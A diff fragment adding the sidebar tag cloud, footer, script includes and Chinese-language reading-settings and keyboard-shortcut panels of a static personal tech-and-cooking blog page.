+      <a class="sidebar-tag" href="/tags/ReAct/">ReAct</a>
+      
+      <a class="sidebar-tag" href="/tags/Redis/">Redis</a>
+      
+      <a class="sidebar-tag" href="/tags/Regular%20Expression/">Regular Expression</a>
+      
+      <a class="sidebar-tag" href="/tags/SFT/">SFT</a>
+      
+      <a class="sidebar-tag" href="/tags/SQL/">SQL</a>
+      
+      <a class="sidebar-tag" href="/tags/Self-Supervision%20Learning/">Self-Supervision Learning</a>
+      
+      <a class="sidebar-tag" href="/tags/System%20Design/">System Design</a>
+      
+      <a class="sidebar-tag" href="/tags/TCP/">TCP</a>
+      
+      <a class="sidebar-tag" href="/tags/TCP/IP/">TCP/IP</a>
+      
+      <a class="sidebar-tag" href="/tags/TTS/">TTS</a>
+      
+      <a class="sidebar-tag" href="/tags/Tool%20Calling/">Tool Calling</a>
+      
+      <a class="sidebar-tag" href="/tags/Tool%20Use/">Tool Use</a>
+      
+      <a class="sidebar-tag" href="/tags/Transformer/">Transformer</a>
+      
+      <a class="sidebar-tag" href="/tags/Tree/">Tree</a>
+      
+      <a class="sidebar-tag" href="/tags/Unit%20Testing/">Unit Testing</a>
+      
+      <a class="sidebar-tag" href="/tags/WeChat/">WeChat</a>
+      
+      <a class="sidebar-tag" href="/tags/WebSocket/">WebSocket</a>
+      
+      <a class="sidebar-tag" href="/tags/Website/">Website</a>
+      
+      <a class="sidebar-tag" href="/tags/WeeklyWorking/">WeeklyWorking</a>
+      
+      <a class="sidebar-tag" href="/tags/epoll/">epoll</a>
+      
+      <a class="sidebar-tag" href="/tags/golang/">golang</a>
+      
+      <a class="sidebar-tag" href="/tags/llama.cpp/">llama.cpp</a>
+      
+      <a class="sidebar-tag" href="/tags/minikube/">minikube</a>
+      
+      <a class="sidebar-tag" href="/tags/neo4j/">neo4j</a>
+      
+      <a class="sidebar-tag" href="/tags/pprof/">pprof</a>
+      
+      <a class="sidebar-tag" href="/tags/vLLM/">vLLM</a>
+      
+      <a class="sidebar-tag" href="/tags/word2vec/">word2vec</a>
+      
+      <a class="sidebar-tag" href="/tags/xxl-job/">xxl-job</a>
+      
+      <a class="sidebar-tag" href="/tags/%e3%81%86%e3%81%a9%e3%82%93/">うどん</a>
+      
+      <a class="sidebar-tag" href="/tags/%e3%81%99%e3%81%8d%e7%84%bc%e3%81%8d/">すき焼き</a>
+      
+      <a class="sidebar-tag" href="/tags/%e3%81%a0%e3%81%97/">だし</a>
+      
+      <a class="sidebar-tag" href="/tags/%e3%81%a8%e3%82%93%e3%81%8b%e3%81%a4/">とんかつ</a>
+      
+      <a class="sidebar-tag" href="/tags/%e3%82%ab%e3%83%84%e4%b8%bc/">カツ丼</a>
+      
+      <a class="sidebar-tag" href="/tags/%e4%b8%8a%e4%b8%8b%e6%96%87%e5%b7%a5%e7%a8%8b/">上下文工程</a>
+      
+      <a class="sidebar-tag" href="/tags/%e4%b9%8c%e5%86%ac%e9%9d%a2/">乌冬面</a>
+      
+      <a class="sidebar-tag" href="/tags/%e4%ba%8b%e5%8a%a1/">事务</a>
+      
+      <a class="sidebar-tag" href="/tags/%e4%ba%b2%e5%ad%90%e4%b8%bc/">亲子丼</a>
+      
+      <a class="sidebar-tag" href="/tags/%e4%bb%a3%e7%a0%81%e7%94%9f%e6%88%90/">代码生成</a>
+      
+      <a class="sidebar-tag" href="/tags/%e4%bc%a0%e8%be%93%e5%b1%82/">传输层</a>
+      
+      <a class="sidebar-tag" href="/tags/%e4%bd%95%e5%ba%b7/">何康</a>
+      
+      <a class="sidebar-tag" href="/tags/%e5%85%a5%e9%97%a8/">入门</a>
+      
+      <a class="sidebar-tag" href="/tags/%e5%86%85%e5%ad%98/">内存</a>
+      
+      <a class="sidebar-tag" href="/tags/%e5%87%ba%e6%b1%81/">出汁</a>
+      
+      <a class="sidebar-tag" href="/tags/%e5%88%9d%e5%ad%a6%e8%80%85/">初学者</a>
+      
+      <a class="sidebar-tag" href="/tags/%e5%8d%8a%e6%88%90%e5%93%81/">半成品</a>
+      
+      <a class="sidebar-tag" href="/tags/%e5%8d%8f%e4%bd%9c%e6%a8%a1%e5%bc%8f/">协作模式</a>
+      
+      <a class="sidebar-tag" href="/tags/%e5%8d%9a%e5%ae%a2/">博客</a>
+      
+      <a class="sidebar-tag" href="/tags/%e5%8d%b5%e7%84%bc%e3%81%8d/">卵焼き</a>
+      
+      <a class="sidebar-tag" href="/tags/%e5%8e%9a%e8%9b%8b%e7%83%a7/">厚蛋烧</a>
+      
+      <a class="sidebar-tag" href="/tags/%e5%8f%a4%e9%a3%8e/">古风</a>
+      
+      <a class="sidebar-tag" href="/tags/%e5%90%8c%e4%ba%ba/">同人</a>
+      
+      <a class="sidebar-tag" href="/tags/%e5%90%8e%e8%ae%ad%e7%bb%83/">后训练</a>
+      
+      <a class="sidebar-tag" href="/tags/%e5%90%91%e9%87%8f%e6%95%b0%e6%8d%ae%e5%ba%93/">向量数据库</a>
+      
+      <a class="sidebar-tag" href="/tags/%e5%91%b3%e5%99%8c/">味噌</a>
+      
+      <a class="sidebar-tag" href="/tags/%e5%91%b3%e5%99%8c%e6%b1%81/">味噌汁</a>
+      
+      <a class="sidebar-tag" href="/tags/%e5%91%b3%e5%99%8c%e6%b1%a4/">味噌汤</a>
+      
+      <a class="sidebar-tag" href="/tags/%e5%93%88%e5%b8%8c%e8%a1%a8/">哈希表</a>
+      
+      <a class="sidebar-tag" href="/tags/%e5%9b%be/">图</a>
+      
+      <a class="sidebar-tag" href="/tags/%e5%9c%a8%e5%ae%b6%e5%81%9a%e9%a5%ad/">在家做饭</a>
+      
+      <a class="sidebar-tag" href="/tags/%e5%a4%9aAgent/">多Agent</a>
+      
+      <a class="sidebar-tag" href="/tags/%e5%a4%9a%e6%a8%a1%e6%80%81/">多模态</a>
+      
+      <a class="sidebar-tag" href="/tags/%e5%ad%98%e5%82%a8%e5%99%a8/">存储器</a>
+      
+      <a class="sidebar-tag" href="/tags/%e5%ae%9e%e6%88%98/">实战</a>
+      
+      <a class="sidebar-tag" href="/tags/%e5%af%bf%e5%96%9c%e7%83%a7/">寿喜烧</a>
+      
+      <a class="sidebar-tag" href="/tags/%e5%b7%a5%e5%85%b7%e8%b0%83%e7%94%a8/">工具调用</a>
+      
+      <a class="sidebar-tag" href="/tags/%e5%ba%94%e7%91%9e/">应瑞</a>
+      
+      <a class="sidebar-tag" href="/tags/%e5%bc%80%e5%8f%91%e6%a1%86%e6%9e%b6/">开发框架</a>
+      
+      <a class="sidebar-tag" href="/tags/%e5%be%ae%e8%b0%83/">微调</a>
+      
+      <a class="sidebar-tag" href="/tags/%e6%8c%81%e7%bb%ad%e8%bf%9b%e5%8c%96/">持续进化</a>
+      
+      <a class="sidebar-tag" href="/tags/%e6%8e%92%e5%ba%8f/">排序</a>
+      
+      <a class="sidebar-tag" href="/tags/%e6%8e%a8%e7%90%86%e4%bc%98%e5%8c%96/">推理优化</a>
+      
+      <a class="sidebar-tag" href="/tags/%e6%8e%a8%e7%90%86%e5%bc%95%e6%93%8e/">推理引擎</a>
+      
+      <a class="sidebar-tag" href="/tags/%e6%8f%90%e7%a4%ba%e5%b7%a5%e7%a8%8b/">提示工程</a>
+      
+      <a class="sidebar-tag" href="/tags/%e6%93%8d%e4%bd%9c%e7%b3%bb%e7%bb%9f/">操作系统</a>
+      
+      <a class="sidebar-tag" href="/tags/%e6%95%b0%e5%ad%a6%e5%9f%ba%e7%a1%80/">数学基础</a>
+      
+      <a class="sidebar-tag" href="/tags/%e6%95%b0%e6%8d%ae%e5%ba%93/">数据库</a>
+      
+      <a class="sidebar-tag" href="/tags/%e6%95%b0%e6%8d%ae%e7%bb%93%e6%9e%84/">数据结构</a>
+      
+      <a class="sidebar-tag" href="/tags/%e6%96%87%e4%bb%b6%e7%b3%bb%e7%bb%9f/">文件系统</a>
+      
+      <a class="sidebar-tag" href="/tags/%e6%97%a5%e6%96%99/">日料</a>
+      
+      <a class="sidebar-tag" href="/tags/%e6%9c%ac%e5%9c%b0%e6%8e%a8%e7%90%86/">本地推理</a>
+      
+      <a class="sidebar-tag" href="/tags/%e6%9c%ba%e5%99%a8%e5%ad%a6%e4%b9%a0/">机器学习</a>
+      
+      <a class="sidebar-tag" href="/tags/%e6%9e%b6%e6%9e%84/">架构</a>
+      
+      <a class="sidebar-tag" href="/tags/%e6%a0%91/">树</a>
+      
+      <a class="sidebar-tag" href="/tags/%e6%a3%80%e7%b4%a2%e5%a2%9e%e5%bc%ba/">检索增强</a>
+      
+      <a class="sidebar-tag" href="/tags/%e6%b2%aa%e6%b7%b1300/">沪深300</a>
+      
+      <a class="sidebar-tag" href="/tags/%e6%b5%81%e6%b0%b4%e7%ba%bf/">流水线</a>
+      
+      <a class="sidebar-tag" href="/tags/%e6%b7%b1%e5%ba%a6%e5%ad%a6%e4%b9%a0/">深度学习</a>
+      
+      <a class="sidebar-tag" href="/tags/%e6%b8%a9%e6%b3%89%e8%9b%8b/">温泉蛋</a>
+      
+      <a class="sidebar-tag" href="/tags/%e7%81%ab%e9%94%85/">火锅</a>
+      
+      <a class="sidebar-tag" href="/tags/%e7%82%b8%e7%8c%aa%e6%8e%92/">炸猪排</a>
+      
+      <a class="sidebar-tag" href="/tags/%e7%85%a7%e3%82%8a%e7%84%bc%e3%81%8d/">照り焼き</a>
+      
+      <a class="sidebar-tag" href="/tags/%e7%85%a7%e7%83%a7/">照烧</a>
+      
+      <a class="sidebar-tag" href="/tags/%e7%89%9b%e8%82%89/">牛肉</a>
+      
+      <a class="sidebar-tag" href="/tags/%e7%8c%aa%e6%8e%92%e9%a5%ad/">猪排饭</a>
+      
+      <a class="sidebar-tag" href="/tags/%e7%8e%89%e5%ad%90%e7%83%a7/">玉子烧</a>
+      
+      <a class="sidebar-tag" href="/tags/%e7%99%be%e7%a7%91/">百科</a>
+      
+      <a class="sidebar-tag" href="/tags/%e7%9c%9f%e9%a2%98/">真题</a>
+      
+      <a class="sidebar-tag" href="/tags/%e7%9f%a5%e8%af%86%e5%ba%93/">知识库</a>
+      
+      <a class="sidebar-tag" href="/tags/%e7%a2%a7%e8%93%9d%e8%88%aa%e7%ba%bf/">碧蓝航线</a>
+      
+      <a class="sidebar-tag" href="/tags/%e7%ad%96%e7%95%a5%e5%9b%9e%e6%b5%8b/">策略回测</a>
+      
+      <a class="sidebar-tag" href="/tags/%e7%ae%97%e6%b3%95/">算法</a>
+      
+      <a class="sidebar-tag" href="/tags/%e7%b3%bb%e7%bb%9f%e8%ae%be%e8%ae%a1/">系统设计</a>
+      
+      <a class="sidebar-tag" href="/tags/%e7%bd%91%e7%bb%9c%e5%b1%82/">网络层</a>
+      
+      <a class="sidebar-tag" href="/tags/%e8%82%87%e5%92%8c/">肇和</a>
+      
+      <a class="sidebar-tag" href="/tags/%e8%87%aa%e6%88%91%e6%94%b9%e8%bf%9b/">自我改进</a>
+      
+      <a class="sidebar-tag" href="/tags/%e8%a6%aa%e5%ad%90%e4%b8%bc/">親子丼</a>
+      
+      <a class="sidebar-tag" href="/tags/%e8%a7%86%e8%a7%89%e6%a8%a1%e5%9e%8b/">视觉模型</a>
+      
+      <a class="sidebar-tag" href="/tags/%e8%ae%a1%e7%ae%97%e6%9c%ba%e7%bb%84%e6%88%90%e5%8e%9f%e7%90%86/">计算机组成原理</a>
+      
+      <a class="sidebar-tag" href="/tags/%e8%ae%a1%e7%ae%97%e6%9c%ba%e7%bd%91%e7%bb%9c/">计算机网络</a>
+      
+      <a class="sidebar-tag" href="/tags/%e8%ae%ad%e7%bb%83/">训练</a>
+      
+      <a class="sidebar-tag" href="/tags/%e8%ae%b0%e5%bf%86%e7%b3%bb%e7%bb%9f/">记忆系统</a>
+      
+      <a class="sidebar-tag" href="/tags/%e8%af%84%e4%bc%b0/">评估</a>
+      
+      <a class="sidebar-tag" href="/tags/%e8%af%ad%e9%9f%b3/">语音</a>
+      
+      <a class="sidebar-tag" href="/tags/%e8%af%bb%e4%b9%a6%e7%ac%94%e8%ae%b0/">读书笔记</a>
+      
+      <a class="sidebar-tag" href="/tags/%e8%b0%83%e5%91%b3%e6%96%99/">调味料</a>
+      
+      <a class="sidebar-tag" href="/tags/%e8%b0%83%e7%a0%94/">调研</a>
+      
+      <a class="sidebar-tag" href="/tags/%e8%bf%9b%e7%a8%8b/">进程</a>
+      
+      <a class="sidebar-tag" href="/tags/%e9%80%b8%e4%bb%99/">逸仙</a>
+      
+      <a class="sidebar-tag" href="/tags/%e9%83%a8%e7%bd%b2/">部署</a>
+      
+      <a class="sidebar-tag" href="/tags/%e9%87%8f%e5%8c%96/">量化</a>
+      
+      <a class="sidebar-tag" href="/tags/%e9%87%8f%e5%8c%96%e4%ba%a4%e6%98%93/">量化交易</a>
+      
+      <a class="sidebar-tag" href="/tags/%e9%95%87%e6%b5%b7/">镇海</a>
+      
+      <a class="sidebar-tag" href="/tags/%e9%98%bf%e9%87%8c%e4%ba%91%e7%99%be%e7%82%bc/">阿里云百炼</a>
+      
+      <a class="sidebar-tag" href="/tags/%e9%9d%99%e6%80%81%e7%bd%91%e7%ab%99%e7%94%9f%e6%88%90%e5%99%a8/">静态网站生成器</a>
+      
+      <a class="sidebar-tag" href="/tags/%e9%9d%a2%e8%af%95/">面试</a>
+      
+      <a class="sidebar-tag" href="/tags/%e9%a2%84%e5%88%b6%e8%8f%9c/">预制菜</a>
+      
+      <a class="sidebar-tag" href="/tags/%e9%a3%9f%e8%b0%b1/">食谱</a>
+      
+      <a class="sidebar-tag" href="/tags/%e9%ab%98%e6%b1%a4/">高汤</a>
+      
+      <a class="sidebar-tag" href="/tags/%e9%b8%a1%e8%82%89/">鸡肉</a>
+      
+      <a class="sidebar-tag" href="/tags/%e9%b8%a1%e8%9b%8b/">鸡蛋</a>
+      
+    </div>
+  </div>
+  
+</aside>
+
+</main>
+
+
+<footer class="site-footer">
+  <div class="footer-inner">
+    <div class="footer-copyright">
+      &copy; CC BY-NC-SA 4.0
+      
+    </div>
+    <div class="footer-social">
+      
+      <a href="https://github.com/KurongTohsaka" target="_blank" rel="noopener">GitHub</a>
+      
+      
+      
+    </div>
+    <div class="footer-badge">Powered by Chenhai &middot; Zhenhai</div>
+  </div>
+</footer>
+
+
+<script defer src="/assets/js/main.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/fuse.js@7.0.0/dist/fuse.min.js"></script>
+<script defer src="/assets/js/search.js"></script>
+<button id="back-to-top" class="back-to-top" aria-label="回到顶部">↑</button>
+
+
+<div id="settings-panel" class="settings-panel" aria-hidden="true">
+  <div class="settings-panel-header">
+    <span>阅读设置</span>
+    <button id="settings-close" class="settings-close" aria-label="关闭">×</button>
+  </div>
+  <div class="settings-panel-body">
+    <div class="settings-group">
+      <label>字号</label>
+      <div class="settings-options" data-setting="font-size">
+        <button data-value="small" class="setting-option">小</button>
+        <button data-value="medium" class="setting-option active">中</button>
+        <button data-value="large" class="setting-option">大</button>
+      </div>
+    </div>
+    <div class="settings-group">
+      <label>阅读宽度</label>
+      <div class="settings-options" data-setting="reading-width">
+        <button data-value="narrow" class="setting-option active">窄栏</button>
+        <button data-value="wide" class="setting-option">宽栏</button>
+      </div>
+    </div>
+    <div class="settings-group" id="dark-level-group">
+      <label>暗色深度</label>
+      <div class="settings-options" data-setting="dark-level">
+        <button data-value="soft" class="setting-option active">柔和</button>
+        <button data-value="medium" class="setting-option">适中</button>
+        <button data-value="deep" class="setting-option">深邃</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div id="shortcuts-panel" class="shortcuts-panel" aria-hidden="true">
+  <div class="shortcuts-panel-inner">
+    <h3>键盘快捷键</h3>
+    <table><tbody>
+      <tr><td><kbd>J</kbd></td><td>下一篇</td></tr>
+      <tr><td><kbd>K</kbd></td><td>上一篇</td></tr>
+      <tr><td><kbd>Ctrl+K</kbd></td><td>搜索</td></tr>
+      <tr><td><kbd>?</kbd></td><td>显示/隐藏快捷键</td></tr>
+      <tr><td><kbd>Esc</kbd></td><td>关闭面板</td></tr>
+      <tr><td><kbd>G</kbd> <kbd>H</kbd></td><td>回到首页</td></tr>
+      <tr><td><kbd>G</kbd> <kbd>T</kbd></td><td>回到顶部</td></tr>
+    </tbody></table>
+    <p style="margin-top:1rem;font-size:0.8rem;color:var(--color-text-secondary)">在非输入区域按下 <kbd>?</kbd> 即可唤出此面板</p>
+  </div>
+</div>
+</body>
+</html>
